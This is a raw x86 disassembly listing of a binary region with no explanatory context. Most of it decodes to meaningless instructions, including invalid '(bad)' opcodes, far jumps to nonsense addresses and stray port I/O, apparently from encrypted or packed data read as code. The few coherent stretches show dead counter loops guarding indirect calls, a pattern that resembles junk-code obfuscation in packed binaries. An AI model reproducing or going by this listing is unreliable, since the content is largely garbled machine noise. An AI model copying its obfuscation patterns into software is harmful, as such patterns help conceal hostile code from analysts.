  408c10:	repz pop ss
  408c12:	xchg   edi,eax
  408c13:	mov    DWORD PTR [edi],ebx
  408c15:	pop    ebx
  408c16:	fimul  WORD PTR [ecx-0x431382f8]
  408c1c:	cs ds add eax,0x6294edbb
  408c23:	cli    
  408c24:	mov    esi,0x44955dc6
  408c29:	pop    ebp
  408c2a:	js     0x408bb0
  408c2c:	mov    fs,WORD PTR [edi+ecx*1]
  408c2f:	mov    edi,0xbaf2c724
  408c34:	frstor [ebp-0x555020bc]
  408c3a:	push   ebp
  408c3b:	push   ds
  408c3c:	cmp    DWORD PTR [ebx],esp
  408c3e:	mov    ch,0x6d
  408c40:	sub    DWORD PTR [ecx-0x5e5c1df3],esi
  408c46:	xchg   edi,eax
  408c47:	enter  0xbdd4,0x1b
  408c4b:	dec    esi
  408c4c:	add    ecx,edi
  408c4e:	dec    esi
  408c4f:	in     al,dx
  408c50:	mov    bl,0x5b
  408c52:	pop    ds
  408c53:	dec    edi
  408c54:	retf   
  408c55:	jo     0x408c4f
  408c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c58:	add    BYTE PTR [ecx+0x32c13dae],0xee
  408c5f:	jmp    0x497:0x45b5e451
  408c66:	test   DWORD PTR [edx],esi
  408c68:	hlt    
  408c69:	fldenv [edx+0x18]
  408c6c:	(bad)  [esi+0x4a]
  408c6f:	sub    DWORD PTR [ebp-0x23f8c73f],ecx
  408c75:	int    0xe9
  408c77:	cmp    eax,0x62ad8be6
  408c7c:	ds cmp eax,0x3c79b546
  408c82:	xchg   ebp,eax
  408c83:	xchg   ebx,eax
  408c84:	repz ds in al,0xd4
  408c88:	ret    0x95a0
  408c8b:	fdivr  DWORD PTR [ebp+0x30db987]
  408c91:	(bad)  
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cb7:	das    
  408cb8:	(bad)  
  408cb9:	ficom  DWORD PTR [esp+ebx*8]
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	and    BYTE PTR [ebx-0x63],0xdb
  408cc6:	repnz rol DWORD PTR [ecx],0x88
  408cca:	shl    DWORD PTR [ebx],1
  408ccc:	je     0x408d2d
  408cce:	ins    DWORD PTR es:[edi],dx
  408ccf:	or     DWORD PTR [eax+0x4ccdb64d],0xffffffd4
  408cd6:	call   0xa2ad:0xd92df3a1
  408cdd:	stos   DWORD PTR es:[edi],eax
  408cde:	push   0x7407380f
  408ce3:	xor    BYTE PTR [ecx+0x8d0ebc],dl
  408ce9:	dec    esi
  408cea:	mov    al,ds:0xb28d962b
  408cef:	jle    0x408d03
  408cf1:	mov    ebx,DWORD PTR [ebx]
  408cf3:	cmp    BYTE PTR [edx+0x3450d6f8],dh
  408cf9:	dec    esi
  408cfa:	in     al,dx
  408cfb:	jbe    0x408d27
  408cfd:	popa   
  408cfe:	dec    edi
  408cff:	fisubr WORD PTR [ebp+0x3b2a7a8f]
  408d05:	xor    al,0xcf
  408d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d08:	mov    ds:0xe93f45de,eax
  408d0d:	sbb    DWORD PTR [ecx],edi
  408d0f:	(bad)  
  408d10:	cmc    
  408d11:	outs   dx,BYTE PTR ds:[esi]
  408d12:	adc    edx,DWORD PTR [edx+edi*2]
  408d15:	int    0xa3
  408d17:	cld    
  408d18:	repz (bad)
  408d1b:	push   0x25c7a0ae
  408d20:	retf   
  408d21:	enter  0x94e8,0xe6
  408d25:	enter  0xfa6b,0x3a
  408d29:	stos   DWORD PTR es:[edi],eax
  408d2a:	jmp    0x408d49
  408d2c:	pop    eax
  408d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d2e:	inc    esp
  408d2f:	dec    ecx
  408d30:	test   eax,0xef14a50f
  408d35:	imul   esp,DWORD PTR [edx+0x48],0xd675b078
  408d3c:	stc    
  408d3d:	and    DWORD PTR [ebx-0x36],ebx
  408d40:	add    BYTE PTR [edx-0x36],cl
  408d43:	push   0x7025afcf
  408d48:	xor    edx,eax
  408d4a:	ficomp WORD PTR [edi+0x54]
  408d4d:	daa    
  408d4e:	jo     0x408d89
  408d50:	cwde   
  408d51:	retf   0x85bf
  408d54:	ins    DWORD PTR es:[edi],dx
  408d55:	mov    es,WORD PTR [edi]
  408d57:	dec    esi
  408d58:	push   eax
  408d59:	xor    BYTE PTR [edi],al
  408d5b:	or     dh,bl
  408d5d:	mov    ds:0x5858bba6,eax
  408d62:	imul   ebx,DWORD PTR [eax],0x83318f76
  408d68:	loopne 0x408cfb
  408d6a:	clc    
  408d6b:	adc    eax,0x4ba71eda
  408d70:	rcr    BYTE PTR [edx-0x4a],0xd2
  408d74:	push   fs
  408d76:	pop    ds
  408d77:	popf   
  408d78:	daa    
  408d79:	dec    ebx
  408d7a:	js     0x408dcc
  408d7c:	fwait
  408d7d:	icebp  
  408d7e:	addr16 ror ecx,1
  408d81:	xor    eax,0xe9b488a1
  408d86:	cmp    BYTE PTR [edi-0x7c],al
  408d89:	sar    DWORD PTR [ebx+0x4b5e9936],cl
  408d8f:	dec    edi
  408d90:	push   ebp
  408d91:	adc    edx,esp
  408d93:	mov    bl,0x5b
  408d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d96:	ret    0xc346
  408d99:	or     eax,eax
  408d9b:	dec    ecx
  408d9c:	adc    DWORD PTR [edx],0x14
  408d9f:	stos   DWORD PTR es:[edi],eax
  408da0:	xchg   BYTE PTR [ebx-0x2361acdb],al
  408da6:	sub    al,BYTE PTR [ebx-0x545c6dc5]
  408dac:	loope  0x408db2
  408dae:	stc    
  408daf:	retf   0x2e1c
  408db2:	sahf   
  408db3:	fs xchg esp,eax
  408db5:	test   esi,ebx
  408db7:	aas    
  408db8:	jg     0x408df2
  408dba:	mov    eax,0x5359ccbd
  408dbf:	(bad)  
  408dc0:	loop   0x408d7b
  408dc2:	pusha  
  408dc3:	cli    
  408dc4:	dec    eax
  408dc5:	repz repz xor al,al
  408dc9:	test   eax,0xcaece93
  408dce:	ja     0x408ddc
  408dd0:	xchg   BYTE PTR [ebp+0x289130a4],ch
  408dd6:	fsub   st,st(3)
  408dd8:	push   edi
  408dd9:	or     esi,edi
  408ddb:	pop    ecx
  408ddc:	enter  0x878a,0xf6
  408de0:	lahf   
  408de1:	je     0x408de3
  408de3:	and    edi,esi
  408de5:	call   0x1ad45eff
  408dea:	jge    0x408e34
  408dec:	outs   dx,BYTE PTR ds:[esi]
  408ded:	or     eax,0xc12a8
  408df2:	jbe    0x408e6d
  408df4:	loope  0x408dca
  408df6:	aaa    
  408df7:	iret   
  408df8:	mov    bl,BYTE PTR [esi-0x4e]
  408dfb:	pop    es
  408dfc:	add    cl,BYTE PTR [esp+ecx*4]
  408dff:	std    
  408e00:	leave  
  408e01:	ret    0xa9e2
  408e04:	and    esp,DWORD PTR [edi]
  408e06:	sbb    esp,ecx
  408e08:	sahf   
  408e09:	mov    esp,0xdf68ac4d
  408e0e:	mov    eax,ds:0x376321e1
  408e13:	hlt    
  408e14:	dec    ebx
  408e15:	cmp    ecx,DWORD PTR [ebp-0x254a167a]
  408e1b:	jecxz  0x408e2a
  408e1d:	or     al,0x42
  408e1f:	ja     0x408e2e
  408e21:	pop    eax
  408e22:	mov    ch,0x7
  408e24:	shl    ch,1
  408e26:	adc    BYTE PTR [esi-0x40eca783],cl
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xc6c4d7f6
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	or     eax,0x498ae0d4
  408e6c:	inc    esp
  408e6d:	je     0x408e8c
  408e6f:	and    ecx,0x69
  408e72:	jbe    0x408e69
  408e74:	adc    eax,DWORD PTR [eax-0x4]
  408e77:	adc    cl,BYTE PTR [edx+ebx*4]
  408e7a:	and    BYTE PTR ds:0xac28f5d1,0x33
  408e81:	push   ecx
  408e82:	out    dx,eax
  408e83:	adc    al,0xa1
  408e85:	dec    edi
  408e86:	mov    ebx,0x606edd73
  408e8b:	push   sp
  408e8d:	shr    ch,cl
  408e8f:	xor    BYTE PTR [esi+ebx*4],bh
  408e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e93:	cmp    eax,0xaf51fd52
  408e98:	jns    0x408ec1
  408e9a:	jl     0x408e30
  408e9c:	clc    
  408e9d:	mov    esi,0x3a21e4bc
  408ea2:	pop    edx
  408ea3:	mov    edx,0x2664dd05
  408ea8:	test   al,0x1f
  408eaa:	(bad)  
  408eac:	mov    esi,esi
  408eae:	inc    eax
  408eaf:	pushf  
  408eb0:	sbb    ebp,edi
  408eb2:	jno    0x408e3b
  408eb4:	cld    
  408eb5:	mov    ebp,0x5f6db8a9
  408eba:	push   edi
  408ebb:	mov    ds:0x81af306d,eax
  408ec0:	repz addr16 test cx,ax
  408ec5:	cmp    al,BYTE PTR [eax]
  408ec7:	and    BYTE PTR [ecx],bh
  408ec9:	push   eax
  408eca:	add    DWORD PTR [ebp-0x75],esp
  408ecd:	dec    ebx
  408ece:	or     edx,eax
  408ed0:	or     ebp,esp
  408ed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ed3:	int    0xc1
  408ed5:	out    dx,al
  408ed6:	xchg   ebx,eax
  408ed7:	sbb    esp,esp
  408ed9:	jmp    0x4d02:0x5d580aaf
  408ee0:	xor    bh,BYTE PTR [edi+0x5e8087c1]
  408ee6:	aas    
  408ee7:	test   eax,0x52704328
  408eec:	xchg   edi,eax
  408eed:	out    0x46,al
  408eef:	fcomp  QWORD PTR [edi]
  408ef1:	call   0xd624:0x8b4d8311
  408ef8:	jmp    0x8d4cebf7
  408efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408efe:	pop    eax
  408eff:	int    0x37
  408f01:	(bad)  
  408f02:	scas   al,BYTE PTR es:[edi]
  408f03:	add    DWORD PTR [ebx+0x4b],0x16833c67
  408f0a:	outs   dx,DWORD PTR ds:[esi]
  408f0b:	(bad)  
  408f0c:	mov    esp,0x37658d7b
  408f11:	dec    ebp
  408f12:	pop    edx
  408f13:	ins    BYTE PTR es:[edi],dx
  408f14:	je     0x408f05
  408f16:	push   0x0
  408f18:	adc    al,0x3c
  408f1a:	xchg   ebp,eax
  408f1b:	pop    ebp
  408f1c:	(bad)  
  408f1d:	xchg   edx,eax
  408f1e:	push   ecx
  408f1f:	sbb    dl,dh
  408f21:	add    eax,0xb3cb1436
  408f26:	loop   0x408f0e
  408f28:	mov    ch,0xa2
  408f2a:	mov    eax,0x41330828
  408f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f31:	push   edi
  408f32:	loopne 0x408efd
  408f34:	int    0x9b
  408f36:	pop    es
  408f37:	add    al,0xd6
  408f39:	xor    al,0x8f
  408f3b:	imul   eax,DWORD PTR [edx],0xb59711c
  408f41:	leave  
  408f42:	push   edi
  408f43:	pushf  
  408f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f45:	push   0x91e3faa3
  408f4a:	mov    ch,BYTE PTR [ebx]
  408f4c:	push   0x32
  408f4e:	push   ds
  408f4f:	sbb    esi,DWORD PTR [ebx-0x1f]
  408f52:	dec    edi
  408f53:	ror    DWORD PTR [ebx],1
  408f55:	xchg   ebp,eax
  408f56:	imul   edx
  408f58:	add    esp,DWORD PTR [ebx]
  408f5a:	stos   DWORD PTR es:[edi],eax
  408f5b:	xchg   ebx,eax
  408f5c:	pop    es
  408f5d:	push   0xffffffe7
  408f5f:	add    eax,0xae46b66a
  408f64:	test   DWORD PTR [edx],ebx
  408f66:	enter  0x5854,0x81
  408f6a:	add    DWORD PTR fs:[ecx-0x66eb5823],esp
  408f71:	lods   eax,DWORD PTR ds:[esi]
  408f72:	rol    BYTE PTR [eax+0x2cebad7d],1
  408f78:	test   DWORD PTR [eax-0x1c090799],0x97218c4e
  408f82:	mov    edi,0x262f97e4
  408f87:	and    BYTE PTR [edx+0x42683bcf],ch
  408f8d:	or     BYTE PTR [ebp-0x7f5ad849],al
  408f93:	push   eax
  408f94:	sti    
  408f95:	add    BYTE PTR [edi+0x79],0x9c
  408f99:	xchg   edi,eax
  408f9a:	leave  
  408f9b:	lahf   
  408f9c:	(bad)  
  408f9d:	loopne 0x40901d
  408f9f:	rcl    edi,0x66
  408fa2:	or     dh,dl
  408fa4:	push   ecx
  408fa5:	or     eax,DWORD PTR [edx+eax*8-0x74e0d74e]
  408fac:	ins    DWORD PTR es:[edi],dx
  408fad:	adc    BYTE PTR [ebp-0x2f11f7ec],bl
  408fb3:	cmp    edi,0xfffffff9
  408fb6:	mov    esp,0x30c630d8
  408fbb:	imul   eax,DWORD PTR [edx-0x2d9a1c74],0x689fce37
  408fc5:	pop    ss
  408fc6:	cmp    eax,0x9111dab8
  408fcb:	stos   DWORD PTR es:[edi],eax
  408fcc:	stos   DWORD PTR es:[edi],eax
  408fcd:	mov    bh,0x93
  408fcf:	mov    cl,BYTE PTR [eax+0x39]
  408fd2:	cmp    BYTE PTR [edi],cl
  408fd4:	test   BYTE PTR [ecx-0x4700000b],dh
  408fda:	call   0xf8fe:0xe9800f1c
  408fe1:	(bad)  
  408fe2:	call   DWORD PTR [ebp-0x75]
  408fe5:	in     al,dx
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	hlt    
  409165:	sbb    BYTE PTR [ebx+0x7eda6086],dl
  40916b:	jle    0x4091e7
  40916d:	jge    0x4091ed
  40916f:	jle    0x4091c6
  409171:	jnp    0x409195
  409173:	addr16 add eax,0xd926236c
  409179:	inc    esi
  40917a:	push   edi
  40917b:	cs push ebp
  40917d:	in     al,0x14
  40917f:	retf   0x1eb6
  409182:	and    dh,dl
  409184:	push   0x6f038be2
  409189:	mov    esi,0xd65f733
  40918e:	or     eax,0xcf198726
  409193:	loopne 0x409177
  409195:	add    bl,BYTE PTR [ecx-0x51]
  409198:	loop   0x409207
  40919a:	sbb    eax,0xd1717ad2
  40919f:	xchg   DWORD PTR fs:0x57451fa5,esi
  4091a6:	push   es
  4091a7:	dec    ebx
  4091a8:	sti    
  4091a9:	or     eax,0x7d841cc4
  4091ae:	fisub  WORD PTR [ebx+ebp*4+0xeb90635]
  4091b5:	cmp    eax,0xa826792
  4091ba:	pop    ebp
  4091bb:	loop   0x409172
  4091bd:	jmp    0x4091f8
  4091bf:	stos   DWORD PTR es:[edi],eax
  4091c0:	or     dl,dh
  4091c2:	dec    esi
  4091c3:	jge    0x4091c2
  4091c5:	stos   DWORD PTR es:[edi],eax
  4091c6:	inc    edi
  4091c7:	das    
  4091c8:	adc    al,0x4d
  4091ca:	and    ch,BYTE PTR fs:[edx+0x57]
  4091ce:	mov    BYTE PTR [eax+esi*2+0x17f1364e],ah
  4091d5:	cmp    eax,0x715aabad
  4091da:	xchg   ebp,eax
  4091db:	or     edi,edx
  4091dd:	xlat   BYTE PTR ds:[ebx]
  4091de:	jle    0x4091b4
  4091e0:	xchg   ebx,eax
  4091e1:	and    DWORD PTR [ebx+0x36958147],0xf5fbb
  4091eb:	stc    
  4091ec:	jne    0x40925f
  4091ee:	xor    eax,0x1c2f4caf
  4091f4:	dec    ebp
  4091f5:	ret    0xadfc
  4091f8:	jmp    FWORD PTR [ecx+esi*8-0x2c9372c3]
  4091ff:	dec    esp
  409200:	scas   eax,DWORD PTR es:[edi]
  409201:	sub    ecx,edx
  409203:	jecxz  0x409274
  409205:	shl    BYTE PTR [ebx+ecx*8],cl
  409208:	jg     0x4091bb
  40920a:	nop
  40920b:	inc    ebp
  40920c:	push   0xb97d173b
  409211:	ins    DWORD PTR es:[edi],dx
  409212:	into   
  409213:	ins    BYTE PTR es:[edi],dx
  409214:	and    BYTE PTR [edx-0x66a6384d],ch
  40921a:	les    eax,FWORD PTR [ebx+0x72]
  40921d:	dec    edi
  40921e:	mov    WORD PTR [eax],?
  409220:	lods   al,BYTE PTR ds:[esi]
  409221:	jnp    0x4091a6
  409223:	xchg   esi,eax
  409224:	retf   
  409225:	xchg   ebx,eax
  409226:	daa    
  409227:	jo     0x409241
  409229:	cmp    edi,edx
  40922b:	sbb    al,0x2b
  40922d:	inc    edi
  40922e:	dec    ecx
  40922f:	pop    esp
  409230:	or     bh,BYTE PTR [eax-0x6c]
  409233:	adc    DWORD PTR [eax],ecx
  409235:	and    DWORD PTR cs:[edi+0x41e3c92c],edx
  40923c:	push   es
  40923d:	push   dx
  40923f:	outs   dx,DWORD PTR ds:[esi]
  409240:	xor    edx,DWORD PTR [edi-0x4c]
  409243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409244:	mov    WORD PTR [esi],ss
  409246:	(bad)  
  409247:	je     0x409277
  409249:	mov    ebp,0x48e29c9
  40924e:	nop
  40924f:	imul   ecx,DWORD PTR [edx+0x37],0x69
  409253:	iret   
  409254:	cmp    eax,0x6d31d307
  409259:	pop    ebx
  40925a:	sbb    al,0x70
  40925c:	mov    edi,0x89768e2d
  409261:	(bad)  
  409262:	inc    esi
  409263:	and    al,0xd0
  409265:	and    DWORD PTR [esi],ebx
  409267:	aas    
  409268:	std    
  409269:	nop
  40926a:	aaa    
  40926b:	popf   
  40926c:	mov    edi,0x7d297d17
  409271:	sbb    BYTE PTR [esi-0x2b],0xa4
  409275:	int3   
  409276:	xor    BYTE PTR [bp+si],cl
  409279:	and    eax,0x7ca2d207
  40927e:	(bad)
  409281:	nop
  409282:	pop    ebx
  409283:	fadd   DWORD PTR [ecx+ebx*1]
  409286:	or     BYTE PTR [esi+0x611e04f1],bl
  40928c:	push   0x45
  40928e:	test   BYTE PTR [edi-0x4c114ebc],cl
  409294:	add    BYTE PTR [eax],dh
  409296:	add    edi,esi
  409298:	inc    ecx
  409299:	mov    edx,0x6c108a69
  40929e:	jg     0x4092ae
  4092a0:	loopne 0x4092d8
  4092a2:	push   0x8062205a
  4092a7:	shl    BYTE PTR [eax],0x50
  4092aa:	add    DWORD PTR [esi+esi*4],ebp
  4092ad:	(bad)  
  4092ae:	xor    al,0x8a
  4092b0:	dec    edi
  4092b1:	adc    ecx,DWORD PTR [eax+0x230992e9]
  4092b7:	mov    bh,0x1a
  4092b9:	push   ecx
  4092ba:	ja     0x409320
  4092bc:	cmp    BYTE PTR [ebx+0x28],0x93
  4092c0:	mov    esp,0xcfe49fd7
  4092c5:	lods   eax,DWORD PTR ds:[esi]
  4092c6:	or     esi,DWORD PTR [esi-0x30]
  4092c9:	fs dec esp
  4092cb:	add    dh,bh
  4092cd:	ds mov esp,0x272caeef
  4092d3:	shl    BYTE PTR [ebp+0x63bb256],1
  4092d9:	ret    
  4092da:	aam    0x53
  4092dc:	add    al,0xf5
  4092de:	rcl    DWORD PTR [edx+0x73d560d8],1
  4092e4:	ret    
  4092e5:	jb     0x409349
  4092e7:	dec    esi
  4092e9:	(bad)  
  4092ea:	rcl    DWORD PTR [esi-0x5ee37d0a],cl
  4092f0:	cld    
  4092f1:	shr    BYTE PTR fs:[ebx+0x34b4e666],1
  4092f8:	push   ebp
  4092f9:	xchg   esi,eax
  4092fa:	ins    DWORD PTR es:[edi],dx
  4092fb:	iret   
  4092fc:	std    
  4092fd:	test   DWORD PTR [edx],ebp
  4092ff:	int3   
  409300:	pop    ecx
  409301:	sbb    cl,ah
  409303:	fisttp WORD PTR [edx+0x22]
  409306:	jbe    0x4092a6
  409308:	inc    ebx
  409309:	inc    esi
  40930a:	and    al,0xc2
  40930c:	sbb    esp,ecx
  40930e:	aaa    
  40930f:	(bad)  ds:0x4130d70e
  409315:	mov    ebp,0xc7425ab1
  40931a:	mov    al,0x7a
  40931c:	adc    al,BYTE PTR [ecx+ecx*8-0x4d9bb90d]
  409323:	and    eax,0xc731ee01
  409328:	push   ds
  409329:	shr    DWORD PTR [edi+0x2fd38adf],0xf8
  409330:	sbb    DWORD PTR [edx+0x32],edi
  409333:	popf   
  409334:	inc    edx
  409335:	nop
  409336:	push   es
  409337:	aam    0xe9
  409339:	jle    0x409387
  40933b:	scas   al,BYTE PTR es:[edi]
  40933c:	jmp    0x7204:0x605f04d5
  409343:	sub    al,0x12
  409345:	in     eax,dx
  409346:	pop    esi
  409347:	xor    BYTE PTR [eax+0x719dbe93],0x23
  40934e:	pop    eax
  40934f:	sbb    BYTE PTR [edi],bh
  409351:	sar    DWORD PTR [edi-0x39],0x59
  409355:	pop    ds
  409356:	addr16 mul esi
  409359:	mov    ds:0xd68f1639,al
  40935e:	cld    
  40935f:	push   esi
  409360:	xchg   edx,eax
  409361:	dec    edx
  409362:	sub    ah,BYTE PTR [esp+ebp*8-0x3f]
  409366:	cs xor al,0x48
  409369:	mov    BYTE PTR [edi+eiz*1+0x45],dh
  40936d:	pop    ss
  40936e:	cld    
  40936f:	mov    ds:0x609fc6d6,al
  409374:	adc    ebx,edi
  409376:	cdq    
  409377:	out    dx,eax
  409378:	sub    ebx,DWORD PTR [edi+0x7a]
  40937b:	loope  0x409320
  40937d:	cld    
  40937e:	sbb    BYTE PTR [edx+0x4588cd2b],al
  409384:	retf   
  409385:	or     BYTE PTR ds:0x804dcadf,0x1d
  40938c:	inc    ebx
  40938d:	adc    al,BYTE PTR [edx]
  40938f:	mov    esp,0x4359b874
  409394:	xchg   esi,eax
  409395:	adc    eax,0xa03d42b0
  40939a:	(bad)  
  40939b:	scas   al,BYTE PTR es:[edi]
  40939c:	call   FWORD PTR [ebx-0x53706807]
  4093a2:	int    0xe
  4093a4:	sbb    DWORD PTR [eax-0x6f6549bc],esp
  4093aa:	cdq    
  4093ab:	push   ecx
  4093ac:	mov    edi,0x93658467
  4093b1:	sub    eax,0x3879187d
  4093b6:	push   esp
  4093b7:	retf   0xa106
  4093ba:	mov    ebp,0x88e73b9f
  4093bf:	test   DWORD PTR [ecx+0x34518b99],ebx
  4093c5:	jp     0x4093f2
  4093c7:	jg     0x4093f7
  4093c9:	push   edi
  4093ca:	nop
  4093cb:	addr16 xchg ebp,eax
  4093cd:	add    BYTE PTR ds:0x3b545e3a,dh
  4093d3:	dec    esi
  4093d4:	xor    eax,0xfbabbeb0
  4093d9:	mov    cl,0xba
  4093db:	out    dx,eax
  4093dc:	(bad)  
  4093dd:	scas   al,BYTE PTR es:[edi]
  4093de:	call   DWORD PTR [edi+0x5c356612]
  4093e4:	loop   0x4093ba
  4093e6:	push   0x42f0b2b
  4093eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ec:	mov    ch,0xb5
  4093ee:	add    al,BYTE PTR [ebp+0x1f]
  4093f1:	loopne 0x409456
  4093f3:	pop    edi
  4093f4:	lock adc al,0x8e
  4093f7:	fsub   st(0),st
  4093f9:	cwde   
  4093fa:	fisub  DWORD PTR [esi-0x2a]
  4093fd:	imul   DWORD PTR [ebp+0x6d0b400a]
  409403:	inc    esi
  409404:	sub    bl,al
  409406:	daa    
  409407:	jmp    0x4093fa
  409409:	xlat   BYTE PTR ds:[ebx]
  40940a:	push   edi
  40940b:	mov    dh,0xe0
  40940d:	mov    eax,ds:0x8d95ecb
  409412:	loopne 0x409428
  409414:	add    al,0x4a
  409416:	push   edx
  409417:	push   0xbb87133f
  40941c:	lods   eax,DWORD PTR ds:[esi]
  40941d:	fiadd  WORD PTR [eax-0x67]
  409420:	or     eax,0x34585a7b
  409425:	pusha  
  409426:	mov    ds:0x5ce37492,al
  40942b:	rcr    eax,cl
  40942d:	mov    eax,0xbf96e81d
  409432:	fisttp QWORD PTR [edi]
  409434:	mov    ah,0x4d
  409436:	sbb    ebp,DWORD PTR [esi+ebx*4+0x4048ec31]
  40943d:	xchg   ebp,eax
  40943e:	xchg   edi,eax
  40943f:	ror    BYTE PTR [ecx-0x550e683f],cl
  409445:	jmp    0x409493
  409447:	and    al,0xe5
  409449:	test   eax,0x95d52f1d
  40944e:	xchg   DWORD PTR [ebp+0x4a],ebx
  409451:	int3   
  409452:	mov    cl,0xa6
  409454:	jle    0x4093df
  409456:	xchg   edi,eax
  409457:	cmp    DWORD PTR [eax-0x6d7625c1],ecx
  40945d:	push   0x1d
  40945f:	inc    esp
  409460:	xchg   esp,eax
  409461:	loop   0x409475
  409463:	call   FWORD PTR [edx-0x4c]
  409466:	dec    edx
  409467:	ss daa 
  409469:	imul   edi,DWORD PTR [esi-0x6c],0xffffffeb
  40946d:	test   BYTE PTR [edx+0x66b71003],ch
  409473:	and    eax,edi
  409475:	inc    ebp
  409476:	in     al,dx
  409477:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40947d:	sub    edi,DWORD PTR [eax]
  40947f:	inc    ebx
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	add    BYTE PTR [ebx],dh
  409486:	leave  
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
